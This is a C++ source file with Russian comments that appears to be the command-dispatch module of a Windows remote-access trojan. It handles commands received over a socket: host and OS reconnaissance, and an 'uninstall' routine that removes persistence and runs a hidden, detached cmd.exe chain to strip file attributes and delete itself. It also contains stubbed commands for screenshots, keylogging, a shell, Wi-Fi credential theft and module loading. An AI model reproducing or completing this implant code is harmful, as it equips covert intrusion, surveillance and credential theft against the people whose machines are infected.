// Core/commands.cpp
#include "commands.h"
#include "persistence.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <cstring>

// Структура для RtlGetVersion
typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize;
    ULONG dwMajorVersion;
    ULONG dwMinorVersion;
    ULONG dwBuildNumber;
    ULONG dwPlatformId;
    WCHAR  szCSDVersion[128];
} MY_OSVERSIONINFOW;

typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    OutputDebugStringA("[CMD] Received: ");
    OutputDebugStringA(cmd.c_str());
    OutputDebugStringA("\n");

    try {
        if (cmd == "ping") return "pong";
        else if (cmd == "info") {
            char host[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD s = sizeof(host);
            if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
            
            ULONG major = 0, minor = 0, build = 0; 
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                pRtlGetVersion pRtlGetVer = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
                if (pRtlGetVer) {
                    MY_OSVERSIONINFOW rovi = {0};
                    rovi.dwOSVersionInfoSize = sizeof(rovi);
                    if (pRtlGetVer(&rovi) == 0) {
                        major = rovi.dwMajorVersion;
                        minor = rovi.dwMinorVersion;
                        build = rovi.dwBuildNumber;
                    }
                }
            }
            
            std::string os_name = "Windows";
            if (major == 10 && build >= 22000) os_name = "Windows 11";
            else if (major == 10) os_name = "Windows 10";
            else if (major == 6) os_name = "Windows 7/8";

            char buf[256];
            sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
            return std::string(buf);
        } 

        else if (cmd == "uninstall") {
            OutputDebugStringA("[CMD] Executing uninstall sequence...\n");
            
            // 1. Удаление персистенс
            uninstall_persistence();
            
            // 2. Самоудаление файла
            char path[MAX_PATH];
            if (GetModuleFileNameA(NULL, path, MAX_PATH) > 0) {
                // Используем / для путей в cmd, чтобы избежать проблем с кавычками
                // ping -n 5 = ~4 секунды задержки
                // attrib -r -s -h снимает все атрибуты защиты
                // del /f /q форсированное тихое удаление
                char del_cmd[1024];
                sprintf_s(del_cmd, 
                    "cmd.exe /c ping 127.0.0.1 -n 5 >nul && attrib -r -s -h \"%s\" && del /f /q \"%s\"", 
                    path, path);
                
                OutputDebugStringA("[CMD] Self-delete command: ");
                OutputDebugStringA(del_cmd);
                OutputDebugStringA("\n");
                
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi = { 0 };
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                
                BOOL created = CreateProcessA(NULL, del_cmd, NULL, NULL, FALSE, 
                                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
                
                if (created) {
                    OutputDebugStringA("[CMD] Self-delete process created.\n");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                } else {
                    DWORD err = GetLastError();
                    char err_log[128];
                    sprintf_s(err_log, "[CMD] CreateProcess failed! Error: %lu\n", err);
                    OutputDebugStringA(err_log);
                }
            }
            
            // 3. Мгновенное завершение
            if (sock != INVALID_SOCKET) closesocket(sock);
            OutputDebugStringA("[CMD] Process terminating.\n");
            ExitProcess(0);
        }
        else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
        else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
        else if (cmd.find("shell") != std::string::npos) return "SHELL_DISABLED";
        else if (cmd.find("steal_wifi") != std::string::npos) return "STEAL_DISABLED";
        else if (cmd.find("load_module") != std::string::npos) return "LOAD_MODULE_DISABLED";
        
        return "UNKNOWN_COMMAND";
    } 
    catch (...) {
        OutputDebugStringA("[CMD] Exception caught!\n");
        return "INTERNAL_ERROR";
    }
}